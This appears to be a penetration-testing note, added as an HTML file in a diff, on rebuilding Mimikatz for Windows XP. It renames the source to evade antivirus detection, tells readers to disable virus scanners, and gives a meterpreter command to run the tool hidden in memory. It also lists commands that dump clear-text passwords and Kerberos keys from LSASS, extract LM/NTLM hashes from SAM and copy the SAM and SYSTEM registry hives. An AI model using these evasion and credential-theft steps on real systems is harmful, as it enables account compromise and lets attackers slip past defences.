@@ -1,0 +1,159 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Mimikatz on XP</title>
+</head><body><span style="font-family: sans"><span style="font-size: 11pt"><div style="text-align: left">when executing mimikatz I got an error screen on the desktop stating a &quot;DecodePointer&quot; function in Kernel32.dll couldn't be found. I did some research on this error and learnt that the DecodePointer function was only added to kernel32.dll after Windows SP2: Mystery solved! I added the DecodePointer function to the solution, built it, fired up mimikatz on my Windows XP SP0 machine it worked.</div><br/>
+<br/>
+<div style="text-align: left">------------------</div><br/>
+<div style="text-align: left">Author: JollyFrogs, Brisbane</div><br/>
+<div style="text-align: left">NOTE: Disable all virus-scanners before you start downloading, keep them disabled until your files are compiled</div><br/>
+<br/>
+<div style="text-align: left">Get the required programs and files:</div><br/>
+<div style="text-align: left">----------------------------------</div><br/>
+<div style="text-align: left">Download: </div><a href="https://github.com/gentilkiwi/mimikatz/archive/master.zip">https://github.com/gentilkiwi/mimika...ive/master.zip</a><div style="text-align: left"> (Free)</div><br/>
+<div style="text-align: left">Download: GRMWDK_EN_7600_1.ISO from Microsoft (Free)</div><br/>
+<div style="text-align: left">Download: vs2013.4_ce_enu.iso from Microsoft (Free)</div><br/>
+<div style="text-align: left">Download: fnr.exe from </div><a href="https://findandreplace.codeplex.com/downloads/get/809617">https://findandreplace.codeplex.com/...ads/get/809617</a><br/>
+<div style="text-align: left">Download: </div><a href="http://mulder.googlecode.com/svn/trunk/Utils/EncodePointerLib/Release/EncodePointer.lib">http://mulder.googlecode.com/svn/tru...odePointer.lib</a><div style="text-align: left"> (you can optionally compile it from source)</div><br/>
+<br/>
+<br/>
+<div style="text-align: left">Install Driver Development Toolkit:</div><br/>
+<div style="text-align: left">---------------------------------</div><br/>
+<div style="text-align: left">Extract GRMWDK_EN_7600_1.ISO with 7-zip</div><br/>
+<div style="text-align: left">Run KitSetup.exe</div><br/>
+<div style="text-align: left">- Click Yes to start the installation</div><br/>
+<div style="text-align: left">- Tick &quot;Full Development Environment&quot; and leave all other options unticked</div><br/>
+<div style="text-align: left">- Click &quot;OK&quot; in the bottom right</div><br/>
+<div style="text-align: left">- Install path: C:\WinDDK\7600.16385.1\</div><br/>
+<div style="text-align: left">- Click &quot;OK&quot; in the bottom right</div><br/>
+<div style="text-align: left">- Tick &quot;I Agree&quot; in the bottom left and click &quot;OK&quot;</div><br/>
+<div style="text-align: left">NOTE: The installation commences</div><br/>
+<div style="text-align: left">- Click &quot;Finish&quot; in the &quot;Microsoft WDK Install Progress&quot; screen</div><br/>
+<br/>
+<br/>
+<div style="text-align: left">Install Visual Studio 2013 Community Edition:</div><br/>
+<div style="text-align: left">-------------------------------------------</div><br/>
+<div style="text-align: left">Extract vs2013.4_ce_enu.iso with 7-zip</div><br/>
+<div style="text-align: left">Run vs_community.exe</div><br/>
+<div style="text-align: left">- Click &quot;Continue&quot; if you get a setup warning</div><br/>
+<div style="text-align: left">- Install path: C:\Program Files (x86)\Microsoft Visual Studio 12.0\</div><br/>
+<div style="text-align: left">- Tick &quot;I agree to the License Terms and Privacy Policy.&quot;</div><br/>
+<div style="text-align: left">- Untick &quot;Join the Visual Studio Experience Improvement Program&quot;</div><br/>
+<div style="text-align: left">- Click &quot;Next&quot;</div><br/>
+<div style="text-align: left">- Tick and then untick &quot;Select All&quot; to select nothing</div><br/>
+<div style="text-align: left">- Click &quot;INSTALL&quot;</div><br/>
+<div style="text-align: left">- Click &quot;Yes&quot; to close the UAC warning screen</div><br/>
+<div style="text-align: left">NOTE: the installation commences</div><br/>
+<div style="text-align: left">- Click &quot;LAUNCH&quot; after install completes</div><br/>
+<div style="text-align: left">- Click &quot;Not now, maybe later.&quot; in the Welcome screen</div><br/>
+<div style="text-align: left">- Select &quot;General&quot; and Select &quot;Blue&quot; and Click &quot;Start Visual Studio&quot;</div><br/>
+<br/>
+<br/>
+<div style="text-align: left">Prevent AV detection on Mimikatz:</div><br/>
+<div style="text-align: left">---------------------------------</div><br/>
+<div style="text-align: left">Extract mimikatz-master.zip to C:\jollykatz\ (you should end up with C:\jollykatz\mimikatz-master\mimikatz.sln&quot; and a whole bunch of files/folders)</div><br/>
+<br/>
+<div style="text-align: left">run the following in a cmd.exe to rename all files and folders to from &quot;mimi&quot; to &quot;jolly&quot;: </div><br/>
+<div style="text-align: left">powershell.exe -noprofile -command &quot;1..10 | % {Get-ChildItem c:\jollykatz\ -Filter \&quot;*mimi*\&quot; -Recurse | Rename-Item -NewName {$_.name -replace 'mimi','jolly' }}&quot;</div><br/>
+<div style="text-align: left">powershell.exe -noprofile -command &quot;1..10 | % {Get-ChildItem c:\jollykatz\ -Filter \&quot;*kuhl*\&quot; -Recurse | Rename-Item -NewName {$_.name -replace 'kuhl','frog' }}&quot;</div><br/>
+<br/>
+<br/>
+<div style="text-align: left">run fnr.exe with following settings:</div><br/>
+<div style="text-align: left">Dir: C:\jollykatz\</div><br/>
+<div style="text-align: left">Tick &quot;Include sub-directories</div><br/>
+<div style="text-align: left">File Mask: *.*</div><br/>
+<div style="text-align: left">Find: mimi</div><br/>
+<div style="text-align: left">replace: jolly</div><br/>
+<div style="text-align: left">Click &quot;replace&quot;</div><br/>
+<div style="text-align: left">run fnr.exe with following settings:</div><br/>
+<div style="text-align: left">Dir: C:\jollykatz\</div><br/>
+<div style="text-align: left">Tick &quot;Include sub-directories</div><br/>
+<div style="text-align: left">File Mask: *.*</div><br/>
+<div style="text-align: left">Find: kuhl</div><br/>
+<div style="text-align: left">replace: frog</div><br/>
+<div style="text-align: left">Click &quot;replace&quot;</div><br/>
+<div style="text-align: left">run fnr.exe with following settings:</div><br/>
+<div style="text-align: left">Dir: C:\jollykatz\</div><br/>
+<div style="text-align: left">Tick &quot;Include sub-directories</div><br/>
+<div style="text-align: left">File Mask: *.*</div><br/>
+<div style="text-align: left">Find: eo.oe.kiwi </div><img src="image.png"/><br/>
+<div style="text-align: left">replace: THINC.local</div><br/>
+<div style="text-align: left">Click &quot;replace&quot;</div><br/>
+<div style="text-align: left">Close fnr.exe</div><br/>
+<br/>
+<br/>
+<div style="text-align: left">Copy &quot;EncodePointer.lib&quot; to C:\jollykatz\jollykatz-master\lib\Win32</div><br/>
+<div style="text-align: left">Copy &quot;EncodePointer.lib&quot; to C:\jollykatz\jollykatz-master\lib\x64</div><br/>
+<div style="text-align: left">NOTE: We're adding &quot;EncodePointer.lib&quot; because WinXP SP0/SP1 would error out with a DecodePointer error caused by compiling with VS2013</div><br/>
+<br/>
+<br/>
+<div style="text-align: left">Now we'll build &quot;Jollykatz&quot;:</div><br/>
+<div style="text-align: left">-------------------------</div><br/>
+<div style="text-align: left">- Double-click on &quot;C:\jollykatz\jollykatz-master\jollykatz.sln&quot;</div><br/>
+<div style="text-align: left">NOTE: Visual Studio Community Edition opens your project</div><br/>
+<br/>
+<br/>
+<div style="text-align: left">- In the &quot;Solution Explorer&quot; window on the right, expand &quot;global files&quot; -&gt; &quot;lib&quot; -&gt; right-click on &quot;Win32&quot; and select &quot;Add&quot; -&gt; &quot;Existing Item&quot;</div><br/>
+<div style="text-align: left">- Choose &quot;C:\jollykatz\jollykatz-master\lib\Win32\EncodePointer.lib&quot;</div><br/>
+<div style="text-align: left">- In the &quot;Solution Explorer&quot; window on the right, expand &quot;global files&quot; -&gt; &quot;lib&quot; -&gt; right-click on &quot;x64&quot; and select &quot;Add&quot; -&gt; &quot;Existing Item&quot;</div><br/>
+<div style="text-align: left">- Choose &quot;C:\jollykatz\jollykatz-master\lib\x64\EncodePointer.lib&quot;</div><br/>
+<br/>
+<br/>
+<div style="text-align: left">- In the &quot;Solution Explorer&quot; window on the right, right-click on &quot;jollykatz&quot; (might have to scroll to bottom) and select &quot;Properties&quot;</div><br/>
+<div style="text-align: left">- Expand &quot;Configuration Properties&quot; -&gt; &quot;General&quot; -&gt; Set &quot;Use of MFC&quot; to &quot;Use Standard Windows Libraries&quot;</div><br/>
+<div style="text-align: left">- Click &quot;Apply&quot; in the bottom</div><br/>
+<div style="text-align: left">- Expand &quot;Configuration Properties&quot; -&gt; &quot;C/C++&quot; -&gt; &quot;Code Generation&quot; -&gt; Set &quot;Runtime Library&quot; to &quot;Multi-threaded (/MT)&quot;</div><br/>
+<div style="text-align: left">- Click &quot;Apply&quot; in the bottom</div><br/>
+<div style="text-align: left">- Expand &quot;Configuration Properties&quot; -&gt; &quot;Linker&quot; -&gt; &quot;Input&quot; -&gt; Add &quot;EncodePointer.lib;&quot; at the start of &quot;Additional Dependencies&quot; (in front of &quot;advapi32.lib&quot;)</div><br/>
+<div style="text-align: left">- Click &quot;OK&quot; in the bottom</div><br/>
+<br/>
+<br/>
+<div style="text-align: left">- In the top menu bar, click &quot;Build&quot; -&gt; &quot;Rebuild Solution&quot;</div><br/>
+<div style="text-align: left">NOTE: You should see &quot;Rebuild All: 3 succeeded, 0 failed, 0 up-to-date, 0 skipped&quot;</div><br/>
+<div style="text-align: left">NOTE: This means that the 32-bit build succeeded!</div><br/>
+<br/>
+<br/>
+<div style="text-align: left">- In the top bar, next to &quot;Release&quot;, change &quot;Win32&quot; to &quot;x64&quot;</div><br/>
+<div style="text-align: left">- In the top menu bar, click &quot;Build&quot; -&gt; &quot;Rebuild Solution&quot;</div><br/>
+<div style="text-align: left">NOTE: You should see &quot;Rebuild All: 3 succeeded, 0 failed, 0 up-to-date, 0 skipped&quot;</div><br/>
+<div style="text-align: left">NOTE: This means that the 64-bit build succeeded!</div><br/>
+<br/>
+<br/>
+<div style="text-align: left">NOTE: You should now see 5 files in the C:\jollykatz\jollykatz-master\Win32\ directory, of which you will need 3:</div><br/>
+<div style="text-align: left">- jollykatz.exe</div><br/>
+<div style="text-align: left">- jollylib.dll</div><br/>
+<div style="text-align: left">- jollydrv.sys</div><br/>
+<div style="text-align: left">NOTE: You should see the same file structure in the C:\jollykatz\jollykatz-master\x64\ directory</div><br/>
+<br/>
+<br/>
+<div style="text-align: left">Copy and rename C:\jollykatz\jollykatz-master\Win32\jollykatz.exe to C:\jollykatz\jollykatz32.exe</div><br/>
+<div style="text-align: left">Copy and rename C:\jollykatz\jollykatz-master\x64\jollykatz.exe to C:\jollykatz\jollykatz64.exe</div><br/>
+<div style="text-align: left">NOTE: Typically, you only need jollykatz.exe, the driver (jollydrv.sys) and library (jollylib.dll) files are optional. If you need the drivers, copy and rename them as well.</div><br/>
+<br/>
+<br/>
+<div style="text-align: left">NOTE: Hopefully, your antivirus won't pick up on the new jollykatz.exe files. If it does, you'll need to modify some code. Or use the Veil framework.</div><br/>
+<br/>
+<br/>
+<div style="text-align: left">Run Mimikatz from memory through meterpreter (advisable):</div><br/>
+<div style="text-align: left">---------------------------------------------------------</div><br/>
+<div style="text-align: left">execute -H -i -c -m -d calc.exe -f jollykatz.exe -a '&quot;privilege::debug&quot; &quot;sekurlsa::logonPasswords full&quot; &quot;exit&quot;'</div><br/>
+<br/>
+<br/>
+<div style="text-align: left">How to use:</div><br/>
+<div style="text-align: left">------------</div><br/>
+<div style="text-align: left">-- dump clear-text passwords from LSASS process:</div><br/>
+<div style="text-align: left">C:\&gt; jollykatz32.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonPasswords full&quot; &quot;exit&quot;</div><br/>
+<br/>
+<div style="text-align: left">-- Steal users credentials until they reset their passwords:</div><br/>
+<div style="text-align: left">C:\&gt; jollykatz32.exe &quot;privilege::debug&quot; &quot;sekurlsa::ekeys&quot; &quot;exit&quot;</div><br/>
+<br/>
+<div style="text-align: left">-- Dump LM and NTLM hashes from SAM:</div><br/>
+<div style="text-align: left">C:\&gt; jollykatz32.exe &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;lsadump::sam&quot; &quot;exit&quot;</div><br/>
+<br/>
+<div style="text-align: left">-- read SAM file from /repair or ntbackup files:</div><br/>
+<div style="text-align: left">C:\&gt; reg save HKLM\SYSTEM SystemBkup.hiv</div><br/>
+<div style="text-align: left">C:\&gt; reg save HKLM\SAM SamBkup.hiv</div><br/>
+<div style="text-align: left">(Or use Volume Shadow Copy / BootCD to backup these files or get them from the repair folder</div><img src="image 2.png"/><br/>
+<div style="text-align: left">C:\Windows\System32\config\SYSTEM</div><br/>
+<div style="text-align: left">C:\Windows\System32\config\SAM</div><br/>
+<div style="text-align: left">C:\&gt; jollykatz32.exe &quot;lsadump::sam SystemBkup.hiv SamBkup.hiv&quot; &quot;exit&quot;</div> </span></span></body></html>
